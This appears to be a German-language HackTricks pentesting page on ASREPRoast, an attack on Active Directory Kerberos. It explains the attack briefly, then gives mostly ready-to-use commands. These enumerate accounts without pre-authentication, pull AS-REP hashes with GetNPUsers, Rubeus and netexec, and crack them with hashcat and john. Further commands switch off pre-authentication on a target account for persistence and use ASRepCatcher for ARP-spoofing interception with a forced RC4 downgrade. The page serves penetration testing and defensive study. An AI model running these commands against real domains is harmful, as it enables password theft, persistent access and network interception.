# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast ist ein Sicherheitsangriff, der Benutzer ausnutzt, denen das Attribut **Kerberos pre-authentication required attribute** fehlt. Im Wesentlichen erlaubt diese Schwachstelle Angreifern, vom Domain Controller (DC) eine Authentifizierungsanforderung für einen Benutzer anzufordern, ohne das Passwort des Benutzers zu benötigen. Der DC antwortet dann mit einer Nachricht, die mit dem aus dem Passwort des Benutzers abgeleiteten Schlüssel verschlüsselt ist, die Angreifer offline knacken können, um das Passwort des Benutzers zu ermitteln.

Die Hauptvoraussetzungen für diesen Angriff sind:

- **Lack of Kerberos pre-authentication**: Zielbenutzer dürfen diese Sicherheitsfunktion nicht aktiviert haben.
- **Connection to the Domain Controller (DC)**: Angreifer benötigen Zugang zum DC, um Anfragen zu senden und verschlüsselte Nachrichten zu empfangen.
- **Optional domain account**: Ein Domänenkonto ermöglicht Angreifern, verwundbare Benutzer über LDAP-Abfragen effizienter zu identifizieren. Ohne ein solches Konto müssen Angreifer Benutzernamen raten.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Anfordern einer AS_REP-Nachricht
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus wird ein 4768 mit einem Verschlüsselungstyp von 0x17 und preauth type of 0 erzeugen.

#### Kurze One-Liner (Linux)

- Zuerst potenzielle Ziele auflisten (z. B. aus leaked build paths) mit Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Den AS-REP eines einzelnen Benutzers abrufen, selbst mit einem **leeren** Passwort, mit `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec zeigt außerdem LDAP signing/channel binding posture an).
- Knacke mit `hashcat out.asreproast /path/rockyou.txt` – es erkennt automatisch **-m 18200** (etype 23) für AS-REP roast hashes.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

Für einen Benutzer, für den Sie **GenericAll**-Berechtigungen (oder Berechtigungen zum Schreiben von Eigenschaften) haben, **preauth** als nicht erforderlich erzwingen:
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast ohne Anmeldeinformationen

Ein Angreifer kann eine man-in-the-middle-Position nutzen, um AS-REP-Pakete abzufangen, während sie das Netzwerk durchqueren, ohne sich darauf verlassen zu müssen, dass Kerberos pre-authentication deaktiviert ist. Es funktioniert daher für alle Benutzer im VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) ermöglicht uns dies. Außerdem zwingt das Tool Client-Workstations durch Manipulation der Kerberos negotiation zur Verwendung von RC4.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referenzen

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
